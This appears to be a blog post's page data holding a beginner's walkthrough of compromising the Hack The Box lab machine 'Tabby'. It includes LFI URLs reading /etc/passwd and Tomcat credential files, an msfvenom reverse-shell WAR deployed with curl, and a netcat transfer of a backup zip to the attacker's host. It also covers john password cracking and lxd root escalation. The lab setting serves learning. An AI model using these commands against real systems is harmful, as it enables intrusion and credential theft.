__NUXT_JSONP__("/projects/minor_own-a-linux-machine", (function(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z,_,$,aa,ab,ac,ad,ae,af,ag,ah,ai,aj,ak,al,am,an){J.slug=D;J.description=H;J.title=H;J.duration="2 days";J.image="\u002Fimages\u002Fprojects\u002Fminor\u002Fosint\u002Fmain.png";J.tech=[{name:"pentest"},{name:"red-hat"}];J.category=[{name:"minor"},{name:"cyber"},{name:"body of knowledge"}];J.author={name:K,image:"\u002Fimages\u002Fme.jpg",social:{twitter:"rikp777"}};J.createdAt="2022-01-10T00:00:00.000Z";J.toc=[{id:L,depth:B,text:M},{id:N,depth:B,text:O},{id:P,depth:B,text:Q},{id:E,depth:B,text:E},{id:R,depth:B,text:S}];J.body={type:"root",children:[{type:b,tag:T,props:{id:"own-a-linux-machine"},children:[{type:b,tag:f,props:{href:"#own-a-linux-machine",ariaHidden:q,tabIndex:r},children:[{type:b,tag:s,props:{className:[t,u]},children:[]}]},{type:a,value:H}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"Because I use a Linux operating system 'arch' daily. I was wondering how safe I really am on my Linux system when I don't update my packages regular. In this topic I will show my walkthrough of hacking the system named "},{type:b,tag:f,props:{href:"https:\u002F\u002Fwww.hackthebox.com\u002Fhome\u002Fmachines\u002Fprofile\u002F259",rel:[n,o,p],target:g},children:[{type:a,value:"Tabby"}]},{type:a,value:". The machines host IP is 10.10.10.194. The machines difficulty level is set to be low, but then again I'm pretty new at hacking a linux system. First I connected via the VPN and tested the connection by pinging the IP given."}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"I first started by scanning all the ports on the machine. This I did by running the following command: nmap -sV -sC -Pn scan 10.10.10.194"}]},{type:a,value:c},{type:b,tag:v,props:{target:g,rel:[w,a],to:U},children:[{type:a,value:x},{type:b,tag:y,props:{width:z,src:U,alt:"nmap"},children:[]},{type:a,value:c}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"Nmap show that there are a couple of services running with there operating port. We see that port 22 and 80 are open. We see the service name and the version name."}]},{type:a,value:"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{type:b,tag:"table",props:{},children:[{type:b,tag:"thead",props:{},children:[{type:b,tag:F,props:{},children:[{type:b,tag:G,props:{},children:[{type:a,value:"Port"}]},{type:b,tag:G,props:{},children:[{type:a,value:"State"}]},{type:b,tag:G,props:{},children:[{type:a,value:"Service"}]},{type:b,tag:G,props:{},children:[{type:a,value:"Version"}]}]}]},{type:b,tag:"tbody",props:{},children:[{type:b,tag:F,props:{},children:[{type:b,tag:h,props:{},children:[{type:a,value:"22\u002Ftcp"}]},{type:b,tag:h,props:{},children:[{type:a,value:I}]},{type:b,tag:h,props:{},children:[{type:a,value:"ssh"}]},{type:b,tag:h,props:{},children:[{type:a,value:"OpenSSH 8.2p1 Ununtu 4 (Ubuntu Linux; protocol 2.0)"}]}]},{type:b,tag:F,props:{},children:[{type:b,tag:h,props:{},children:[{type:a,value:"80\u002Ftcp"}]},{type:b,tag:h,props:{},children:[{type:a,value:I}]},{type:b,tag:h,props:{},children:[{type:a,value:V}]},{type:b,tag:h,props:{},children:[{type:a,value:"Apache httpd 2.4.41 ((Ubuntu))"}]}]},{type:b,tag:F,props:{},children:[{type:b,tag:h,props:{},children:[{type:a,value:"8080\u002Ftcp"}]},{type:b,tag:h,props:{},children:[{type:a,value:I}]},{type:b,tag:h,props:{},children:[{type:a,value:V}]},{type:b,tag:h,props:{},children:[{type:a,value:"Apache Tomcat"}]}]}]}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"So out this table we can conclude that a Apache web server is running on port 80. When we visit the IP with the given port in a browser we get to see the follow site."}]},{type:a,value:c},{type:b,tag:v,props:{target:g,rel:[w,a],to:W},children:[{type:a,value:x},{type:b,tag:y,props:{width:z,src:W,alt:A},children:[]},{type:a,value:c}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"Most of the links on the page are dead, after some enumeration on the webpage I found a url which is redirecting to the "},{type:b,tag:f,props:{href:X,rel:[n,o,p],target:g},children:[{type:a,value:X}]},{type:a,value:". So I replaced megahosting.htb with my ip and even added megahosting.htb to \u002Fetc\u002Fhosts. The site is the same, but now the links work. After visiting that site I found that the webpage is vulnerable to Local File Inclusion. It can be confirmed by this URL"}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"view-source:"},{type:b,tag:f,props:{href:Y,rel:[n,o,p],target:g},children:[{type:a,value:Y}]}]},{type:a,value:c},{type:b,tag:v,props:{target:g,rel:[w,a],to:Z},children:[{type:a,value:x},{type:b,tag:y,props:{width:z,src:Z,alt:A},children:[]},{type:a,value:c}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"But we also have port 8080 that is running Apache Tomcat by visiting this port in our browser we get the following:"}]},{type:a,value:c},{type:b,tag:v,props:{target:g,rel:[w,a],to:_},children:[{type:a,value:x},{type:b,tag:y,props:{width:z,src:_,alt:A},children:[]},{type:a,value:c}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"In this page there are a couple of useful links. It gives us links to the manager webapp and the host-manager webapp. After some research we know that tomcat users are stored in the following directory file etc\u002Ftomcat9\u002Ftomcat-users.xml or by locate tomcat-users.xml."}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"\u002Fetc\u002Ftomcat9\u002Ftomcat-users.xml\n\u002Fusr\u002Fshare\u002Ftomcat9\u002Fetc\u002Ftomcat-users.xml\n\u002Fvar\u002Flib\u002Fucf\u002Fcache\u002F:etc:tomcat9:tomcat-users.xml"}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"After that we can use our file inclusion by"}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:$},{type:b,tag:f,props:{href:aa,rel:[n,o,p],target:g},children:[{type:a,value:aa}]}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"But nothing shows up. I got to know that configuration files are saved in usr\u002Fshare. Searching more i tried the URL"}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:$},{type:b,tag:f,props:{href:ab,rel:[n,o,p],target:g},children:[{type:a,value:ab}]}]},{type:a,value:c},{type:b,tag:v,props:{target:g,rel:[w,a],to:ac},children:[{type:a,value:x},{type:b,tag:y,props:{width:z,src:ac,alt:A},children:[]},{type:a,value:c}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"So the username and password for tomcat host-manager is tomcat :"}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"Username = tomcat\nPassword = $3cureP4s5w0rd123!\nRoles = admin-gui, manager-script"}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"Let’s login with these credentials and enumerate the gui-panel."}]},{type:a,value:c},{type:b,tag:v,props:{target:g,rel:[w,a],to:ad},children:[{type:a,value:x},{type:b,tag:y,props:{width:z,src:ad,alt:A},children:[]},{type:a,value:c}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"I never worked in this panel so I had to watch some documentation first to understand it. I couldnt really do anything so in the documentation I found there was an api."}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"We can still deploy the "},{type:b,tag:e,props:{},children:[{type:a,value:".war"}]},{type:a,value:" file via "},{type:b,tag:e,props:{},children:[{type:a,value:ae}]},{type:a,value:". First, let’s make a reverse shell payload with "},{type:b,tag:e,props:{},children:[{type:a,value:"msfvenom"}]},{type:a,value:":"}]},{type:a,value:c},{type:b,tag:C,props:{id:L},children:[{type:b,tag:f,props:{href:"#create-reverse-shell",ariaHidden:q,tabIndex:r},children:[{type:b,tag:s,props:{className:[t,u]},children:[]}]},{type:a,value:M}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"msfvenom -p java\u002Fjsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f war \u003E my_reverse_shell.war"}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"Then, using "},{type:b,tag:e,props:{},children:[{type:a,value:ae}]},{type:a,value:", deploy the payload:"}]},{type:a,value:c},{type:b,tag:C,props:{id:N},children:[{type:b,tag:f,props:{href:"#upload-reverse-shell",ariaHidden:q,tabIndex:r},children:[{type:b,tag:s,props:{className:[t,u]},children:[]}]},{type:a,value:O}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file my_reverse_shell.war '"},{type:b,tag:f,props:{href:af,rel:[n,o,p],target:g},children:[{type:a,value:af}]},{type:a,value:"'"}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"Once deployed, by accessing the URL on a browser, we can trigger the payload to call back to our listener."}]},{type:a,value:c},{type:b,tag:C,props:{id:P},children:[{type:b,tag:f,props:{href:"#start-netcat-listener",ariaHidden:q,tabIndex:r},children:[{type:b,tag:s,props:{className:[t,u]},children:[]}]},{type:a,value:Q}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"nc -nvlp 1234"}]},{type:a,value:c},{type:b,tag:v,props:{target:g,rel:[w,a],to:ag},children:[{type:a,value:x},{type:b,tag:y,props:{width:z,src:ag,alt:A},children:[]},{type:a,value:c}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"Further enumeration found that there is a directory called "},{type:b,tag:e,props:{},children:[{type:a,value:"\u002Fvar\u002Fwww\u002Fhtml\u002Ffiles"}]},{type:a,value:" which is owned by the user "},{type:b,tag:e,props:{},children:[{type:a,value:"ash"}]},{type:a,value:"."}]},{type:a,value:c},{type:b,tag:i,props:{className:[j]},children:[{type:b,tag:k,props:{className:[l,m]},children:[{type:b,tag:e,props:{},children:[{type:a,value:"ls -la\ntotal 48\ndrwxr-xr-x 4 root root  4096 Jun 17 16:24 .\ndrwxr-xr-x 3 root root  4096 May 21 10:31 ..\ndrwxr-xr-x 6 root root  4096 Mar 31  2016 assets\n-rw-r--r-- 1 root root   766 Jan 13  2016 favicon.ico\ndrwxr-xr-x 4 ash  ash   4096 Jun 17 21:59 files \n-rw-r--r-- 1 root root 14175 Jun 17 16:24 index.php\n-rw-r--r-- 1 root root  2894 May 21 11:42 logo.png\n-rw-r--r-- 1 root root   123 Jun 16 11:19 news.php\n-rw-r--r-- 1 root root  1574 Mar 10  2016 Readme.txt \n"}]}]}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"Within the files directory, there is an backup zip file."}]},{type:a,value:c},{type:b,tag:i,props:{className:[j]},children:[{type:b,tag:k,props:{className:[l,m]},children:[{type:b,tag:e,props:{},children:[{type:a,value:"ls -la\ntotal 36\ndrwxr-xr-x 4 ash  ash  4096 Jun 17 21:59 .\ndrwxr-xr-x 4 root root 4096 Jun 17 16:24 ..\n-rw-r--r-- 1 ash  ash  8716 Jun 16 13:42 16162020_backup.zip\ndrwxr-xr-x 2 root root 4096 Jun 16 20:13 archive \ndrwxr-xr-x 2 root root 4096 Jun 16 20:13 revoked_certs \n-rw-r--r-- 1 root root 6507 Jun 16 11:25 statement\n"}]}]}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"And using the following \"netcat\" commands, we can download the .zip\" file to our Kali box:"}]},{type:a,value:c},{type:b,tag:i,props:{className:[j]},children:[{type:b,tag:k,props:{className:[l,m]},children:[{type:b,tag:e,props:{},children:[{type:a,value:"# Kali Box\n$ nc -lvnp 80 \u003E backup.zip\n\n# Tabby Box\n$ nc 10.10.14.3 80 \u003C 16162020_backup.zip\n"}]}]}]},{type:a,value:c},{type:b,tag:i,props:{className:[j]},children:[{type:b,tag:k,props:{className:[l,m]},children:[{type:b,tag:e,props:{},children:[{type:a,value:"unzip backup.zip \nArchive:  backup.zip\n    creating: var\u002Fwww\u002Fhtml\u002Fassets\u002F\n [backup.zip]  var\u002Fwww\u002Fhtml\u002Ffavicon.ico password:\n password incorrect--reenter:\n    skipping: var\u002Fwww\u002Fhtml\u002Ffavicon.ico  incorrect password\n    creating: var\u002Fwww\u002Fhtml\u002Ffiles\u002F\n    skipping: var\u002Fwww\u002Fhtml\u002Findex.php  incorrect password\n    skipping: var\u002Fwww\u002Fhtml\u002Flogo.png   incorrect password \n    skipping: var\u002Fwww\u002Fhtml\u002Fnews.php   incorrect password\n    skipping: var\u002Fwww\u002Fhtml\u002FReadme.txt  incorrect password \n"}]}]}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"We can use \"zip2john\" and \"john\" to potentially crack the password"}]},{type:a,value:c},{type:b,tag:C,props:{id:E},children:[{type:b,tag:f,props:{href:"#zip2john",ariaHidden:q,tabIndex:r},children:[{type:b,tag:s,props:{className:[t,u]},children:[]}]},{type:a,value:E}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"zip2john backup.zip \u003E bkcup-prep.zip"}]},{type:a,value:c},{type:b,tag:C,props:{id:R},children:[{type:b,tag:f,props:{href:"#john",ariaHidden:q,tabIndex:r},children:[{type:b,tag:s,props:{className:[t,u]},children:[]}]},{type:a,value:S}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"john --wordlist=\u002Fusr\u002Fshare\u002Fwordlists\u002Frockyou.txt bakcup-prep.zip"}]},{type:a,value:c},{type:b,tag:i,props:{className:[j]},children:[{type:b,tag:k,props:{className:[l,m]},children:[{type:b,tag:e,props:{},children:[{type:a,value:"Using default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32\u002F64])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nadmin@it        (backup.zip)\n1g 0:00:00:02 DONE (2022-01-10) 0.3759g\u002Fs 3895Kp\u002Fs 3895Kc\u002Fs 3895KC\u002Fs adnc153..adenabuck\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession compledted\n"}]}]}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"And it cracked the password as \"admin@it\""}]},{type:a,value:c},{type:b,tag:i,props:{className:[j]},children:[{type:b,tag:k,props:{className:[l,m]},children:[{type:b,tag:e,props:{},children:[{type:a,value:"tomcat@tabby: \u002Fvar\u002Fwww\u002Fhtml\u002Ffiles$ su ash\nsu ash\nPassword: admin@it\n\nash@tabby:\u002Fvar\u002Fwww\u002Fhtml\u002Ffiles$ id\nuid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)\n\nash@tabby:\u002Fvar\u002Fwww\u002Fhtml\u002Ffiles$ cat \u002Fhome\u002Fash\u002Fuser.txt\ncat \u002Fhome\u002Fash\u002Fuser.txt\ne43c28adc365eca134046f4217125178\n\nash@tabby:\u002Fvar\u002Fwww\u002Fhtml\u002Ffiles$\n"}]}]}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"Now we have user access"}]},{type:a,value:c},{type:b,tag:T,props:{id:"root-privilege"},children:[{type:b,tag:f,props:{href:"#root-privilege",ariaHidden:q,tabIndex:r},children:[{type:b,tag:s,props:{className:[t,u]},children:[]}]},{type:a,value:"Root privilege"}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"From the above result, we can see that \"ash\" is member of the \"lxd\" group."}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"The following links provide some great information into the "},{type:b,tag:e,props:{},children:[{type:a,value:"lxd"}]},{type:a,value:" group and exploiting it:"}]},{type:a,value:c},{type:b,tag:"ul",props:{},children:[{type:a,value:c},{type:b,tag:ah,props:{},children:[{type:b,tag:f,props:{href:ai,rel:[n,o,p],target:g},children:[{type:a,value:ai}]}]},{type:a,value:c},{type:b,tag:ah,props:{},children:[{type:b,tag:f,props:{href:aj,rel:[n,o,p],target:g},children:[{type:a,value:aj}]}]},{type:a,value:c}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"A member of the local \"lxd\" group can effectively escalate the privileges on the host operating system to root in an instant. This is true whether or not the person has been granted sudo access, and it does not need them entering their password. Even with the LXD snap package, the vulnerability persists. This is because LXD is a root process that performs activities for anybody with write access to the LXD UNIX socket, and it frequently ignores the calling user's rights."}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"We'll need the alpine-builder package to take use of this. I used git clone to obtain the package: git clone "},{type:b,tag:f,props:{href:ak,rel:[n,o,p],target:g},children:[{type:a,value:ak}]},{type:a,value:" and then transferred it to the tabby host using a python web server hosted on my kali machine. I was able to transfer it using curl -O from there. We needed to build it using the following commands after we had the alpine package on the host:"}]},{type:a,value:c},{type:b,tag:i,props:{className:[j]},children:[{type:b,tag:k,props:{className:[l,m]},children:[{type:b,tag:e,props:{},children:[{type:a,value:"cd lxd-alpine-builder\nsudo .\u002Fbuild-alpine\n"}]}]}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"From there, I needed to configure LXD, so I started the LXD initialization process with the \"lxd init\" comman. After the image has been built it can be added as an image to LXD as follows:"}]},{type:a,value:c},{type:b,tag:i,props:{className:[j]},children:[{type:b,tag:k,props:{className:[l,m]},children:[{type:b,tag:e,props:{},children:[{type:a,value:"lxc image import .\u002Fapline-v3.10-x86_64-20191008_1227.tar.gz --alias hotshoto\n"}]}]}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"Now that I have created a new lxd container, as a final step I needed to give the container security privileges and then set its mount path as \"\u002Fmnt\" using the following commands:"}]},{type:a,value:c},{type:b,tag:i,props:{className:[j]},children:[{type:b,tag:k,props:{className:[l,m]},children:[{type:b,tag:e,props:{},children:[{type:a,value:"lxc init newalpine hotshoto -c security.privileged=true\nlxc config device add hotshoto container disk source=\u002F path=\u002Fmnt\u002Froot recursive=true\n"}]}]}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"With everything configured, I could start the new image using the following commands:"}]},{type:a,value:c},{type:b,tag:i,props:{className:[j]},children:[{type:b,tag:k,props:{className:[l,m]},children:[{type:b,tag:e,props:{},children:[{type:a,value:"lxc start hotshoto\nlxc exec hotshoto \u002Fbin\u002Fsh\n"}]}]}]},{type:a,value:c},{type:b,tag:i,props:{className:[j]},children:[{type:b,tag:k,props:{className:[l,m]},children:[{type:b,tag:e,props:{},children:[{type:a,value:"ash@tabby: lxc exec hoc hotshoto \u002Fbin\u002Fsh\n# Whoami\nroot \n# echo \" \"; echo \"uname -a:\";uname -a;echo \" \";echo \"hostname:\";hostname;echo \"\";echo \"id\";echo; \" \";echo \"ifconfig:\";\u002Fsbin\u002Fifconfig -a; echo \" \";echo \"groups:\";groups;\n\nuname -a:\nLinux hotshoto 5.4.0.31-generic #35-Ubuntu SMP Thu Jan 11 20:20:34 UTCH 2022 x86_64 Linux\n\nhostname:\nhotshoto\n\nid\nuid=0(root) gid=0(root)\n\nifconfig:\neth0        Link encap:Ethernet   HWaddr 00:16:3E:F4:23:06\n            inet addr:10.52.139.131  Bcast:10.52.139.255  Mask:255.255.255.0\n            inet6 addr: fd42:b312:e739:9016:216:3eff:fef4:2306\u002F64 Scope:\n"}]}]}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"After running the bash file, we see that we have a different shell which is the shell of the container. This container has all the files of the host machine and in order to browse the root object, we simply needed to navigate to \"\u002Fmnt\u002Froot\" to see all resources from the host machine. That’s the box! I"}]}]};J.dir="\u002Fprojects\u002Fminor";J.path="\u002Fprojects\u002Fminor\u002Fown-a-linux-machine";J.extension=".md";J.updatedAt="2022-01-19T10:23:35.896Z";J.bodyPlainText="\n# Own a Linux machine\n\nBecause I use a Linux operating system 'arch' daily. I was wondering how safe I really am on my Linux system when I don't update my packages regular. In this topic I will show my walkthrough of hacking the system named [Tabby](https:\u002F\u002Fwww.hackthebox.com\u002Fhome\u002Fmachines\u002Fprofile\u002F259). The machines host IP is 10.10.10.194. The machines difficulty level is set to be low, but then again I'm pretty new at hacking a linux system. First I connected via the VPN and tested the connection by pinging the IP given. \n\nI first started by scanning all the ports on the machine. This I did by running the following command: nmap -sV -sC -Pn scan 10.10.10.194\n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fnmap.png\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fnmap.png\" alt=\"nmap\"\u002F\u003E\n\u003C\u002Fa\u003E\n\nNmap show that there are a couple of services running with there operating port. We see that port 22 and 80 are open. We see the service name and the version name. \n\n| Port     | State | Service | Version                                             |\n| -------- | ----- | ------- | --------------------------------------------------- |\n| 22\u002Ftcp   | open  | ssh     | OpenSSH 8.2p1 Ununtu 4 (Ubuntu Linux; protocol 2.0) |\n| 80\u002Ftcp   | open  | http    | Apache httpd 2.4.41 ((Ubuntu))                      |\n| 8080\u002Ftcp | open  | http    | Apache Tomcat                                       |\n\nSo out this table we can conclude that a Apache web server is running on port 80. When we visit the IP with the given port in a browser we get to see the follow site.\n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fwebpage.png\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fwebpage.png\" alt=\"webpage\"\u002F\u003E\n\u003C\u002Fa\u003E\n\nMost of the links on the page are dead, after some enumeration on the webpage I found a url which is redirecting to the http:\u002F\u002Fmegahosting.htb\u002Fnews.php?file=statement. So I replaced megahosting.htb with my ip and even added megahosting.htb to \u002Fetc\u002Fhosts. The site is the same, but now the links work. After visiting that site I found that the webpage is vulnerable to Local File Inclusion. It can be confirmed by this URL\n\nview-source:http:\u002F\u002F10.10.10.194\u002Fnews.php?file=..\u002F..\u002F..\u002F..\u002F..\u002Fetc\u002Fpasswd \n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fminor\u002Floaded-page.webp\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Floaded-page.webp\" alt=\"webpage\"\u002F\u003E\n\u003C\u002Fa\u003E\n\nBut we also have port 8080 that is running Apache Tomcat by visiting this port in our browser we get the following:\n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fminor\u002Ftomcat-page.webp\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Ftomcat-page.webp\" alt=\"webpage\"\u002F\u003E\n\u003C\u002Fa\u003E\n\nIn this page there are a couple of useful links. It gives us links to the manager webapp and the host-manager webapp. After some research we know that tomcat users are stored in the following directory file etc\u002Ftomcat9\u002Ftomcat-users.xml or by locate tomcat-users.xml.\n\n\u002Fetc\u002Ftomcat9\u002Ftomcat-users.xml\n\u002Fusr\u002Fshare\u002Ftomcat9\u002Fetc\u002Ftomcat-users.xml\n\u002Fvar\u002Flib\u002Fucf\u002Fcache\u002F:etc:tomcat9:tomcat-users.xml\n\nAfter that we can use our file inclusion by \n\nview-source: http:\u002F\u002F10.10.10.194\u002Fnews.php?file=..\u002F..\u002F..\u002F..\u002Fetc\u002Ftomcat9\u002Ftomcat-users.xml \n\nBut nothing shows up. I got to know that configuration files are saved in usr\u002Fshare. Searching more i tried the URL \n\nview-source: http:\u002F\u002F10.10.10.194\u002Fnews.php?file=..\u002F..\u002F..\u002F..\u002F..\u002F..\u002Fusr\u002Fshare\u002Ftomcat9\u002Fetc\u002Ftomcat-users.xml\n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fminor\u002Ftomcat-password.png\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Ftomcat-password.png\" alt=\"webpage\"\u002F\u003E\n\u003C\u002Fa\u003E\n\nSo the username and password for tomcat host-manager is tomcat :\n\nUsername = tomcat\nPassword = $3cureP4s5w0rd123!\nRoles = admin-gui, manager-script\n\nLet’s login with these credentials and enumerate the gui-panel.\n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fhost-manager.png\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Fhost-manager.png\" alt=\"webpage\"\u002F\u003E\n\u003C\u002Fa\u003E\n\nI never worked in this panel so I had to watch some documentation first to understand it. I couldnt really do anything so in the documentation I found there was an api.\n\n\n\nWe can still deploy the `.war` file via `curl`. First, let’s make a reverse shell payload with `msfvenom`:\n\n### Create Reverse Shell\n\nmsfvenom -p java\u002Fjsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f war \u003E my_reverse_shell.war\n\nThen, using `curl`, deploy the payload:\n\n### Upload Reverse Shell\n\ncurl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file my_reverse_shell.war 'http:\u002F\u002F10.10.10.194:8080\u002Fmanager\u002Ftext\u002Fdeploy?path=\u002Fmy_reverse_shell'\n\nOnce deployed, by accessing the URL on a browser, we can trigger the payload to call back to our listener.\n\n### Start Netcat Listener\n\nnc -nvlp 1234\n\n\u003Ca href=\"\u002Fimages\u002Fprojects\u002Fminor\u002Freverse-shell.png\" target=\"_blank\" rel=\"some text\"\u003E\n  \u003Cimg width=\"80%\" src=\"\u002Fimages\u002Fprojects\u002Fminor\u002Freverse-shell.png\" alt=\"webpage\"\u002F\u003E\n\u003C\u002Fa\u003E\n\nFurther enumeration found that there is a directory called `\u002Fvar\u002Fwww\u002Fhtml\u002Ffiles` which is owned by the user `ash`.\n\n```\nls -la\ntotal 48\ndrwxr-xr-x 4 root root  4096 Jun 17 16:24 .\ndrwxr-xr-x 3 root root  4096 May 21 10:31 ..\ndrwxr-xr-x 6 root root  4096 Mar 31  2016 assets\n-rw-r--r-- 1 root root   766 Jan 13  2016 favicon.ico\ndrwxr-xr-x 4 ash  ash   4096 Jun 17 21:59 files \n-rw-r--r-- 1 root root 14175 Jun 17 16:24 index.php\n-rw-r--r-- 1 root root  2894 May 21 11:42 logo.png\n-rw-r--r-- 1 root root   123 Jun 16 11:19 news.php\n-rw-r--r-- 1 root root  1574 Mar 10  2016 Readme.txt \n```\n\nWithin the files directory, there is an backup zip file.\n\n```\nls -la\ntotal 36\ndrwxr-xr-x 4 ash  ash  4096 Jun 17 21:59 .\ndrwxr-xr-x 4 root root 4096 Jun 17 16:24 ..\n-rw-r--r-- 1 ash  ash  8716 Jun 16 13:42 16162020_backup.zip\ndrwxr-xr-x 2 root root 4096 Jun 16 20:13 archive \ndrwxr-xr-x 2 root root 4096 Jun 16 20:13 revoked_certs \n-rw-r--r-- 1 root root 6507 Jun 16 11:25 statement\n```\n\nAnd using the following \"netcat\" commands, we can download the .zip\" file to our Kali box:\n\n```\n# Kali Box\n$ nc -lvnp 80 \u003E backup.zip\n\n# Tabby Box\n$ nc 10.10.14.3 80 \u003C 16162020_backup.zip\n```\n\n```\nunzip backup.zip \nArchive:  backup.zip\n\tcreating: var\u002Fwww\u002Fhtml\u002Fassets\u002F\n [backup.zip]  var\u002Fwww\u002Fhtml\u002Ffavicon.ico password:\n password incorrect--reenter:\n \tskipping: var\u002Fwww\u002Fhtml\u002Ffavicon.ico  incorrect password\n \tcreating: var\u002Fwww\u002Fhtml\u002Ffiles\u002F\n \tskipping: var\u002Fwww\u002Fhtml\u002Findex.php  incorrect password\n \tskipping: var\u002Fwww\u002Fhtml\u002Flogo.png   incorrect password \n \tskipping: var\u002Fwww\u002Fhtml\u002Fnews.php   incorrect password\n \tskipping: var\u002Fwww\u002Fhtml\u002FReadme.txt  incorrect password \n```\n\nWe can use \"zip2john\" and \"john\" to potentially crack the password\n\n### zip2john\nzip2john backup.zip \u003E bkcup-prep.zip\n\n### John \njohn --wordlist=\u002Fusr\u002Fshare\u002Fwordlists\u002Frockyou.txt bakcup-prep.zip\n\n```\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32\u002F64])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nadmin@it \t\t(backup.zip)\n1g 0:00:00:02 DONE (2022-01-10) 0.3759g\u002Fs 3895Kp\u002Fs 3895Kc\u002Fs 3895KC\u002Fs adnc153..adenabuck\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession compledted\n```\n\nAnd it cracked the password as \"admin@it\"\n\n```\ntomcat@tabby: \u002Fvar\u002Fwww\u002Fhtml\u002Ffiles$ su ash\nsu ash\nPassword: admin@it\n\nash@tabby:\u002Fvar\u002Fwww\u002Fhtml\u002Ffiles$ id\nuid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)\n\nash@tabby:\u002Fvar\u002Fwww\u002Fhtml\u002Ffiles$ cat \u002Fhome\u002Fash\u002Fuser.txt\ncat \u002Fhome\u002Fash\u002Fuser.txt\ne43c28adc365eca134046f4217125178\n\nash@tabby:\u002Fvar\u002Fwww\u002Fhtml\u002Ffiles$\n```\n\nNow we have user access \n\n# Root privilege \n\nFrom the above result, we can see that \"ash\" is member of the \"lxd\" group.\n\nThe following links provide some great information into the `lxd` group and exploiting it:\n\n- https:\u002F\u002Fethicalhackingguru.com\u002Fthe-lxd-privilege-escalation-tutorial-how-to-exploit-lxd\u002F\n- https:\u002F\u002Fwww.hackingarticles.in\u002Flxd-privilege-escalation\u002F\n\nA member of the local \"lxd\" group can effectively escalate the privileges on the host operating system to root in an instant. This is true whether or not the person has been granted sudo access, and it does not need them entering their password. Even with the LXD snap package, the vulnerability persists. This is because 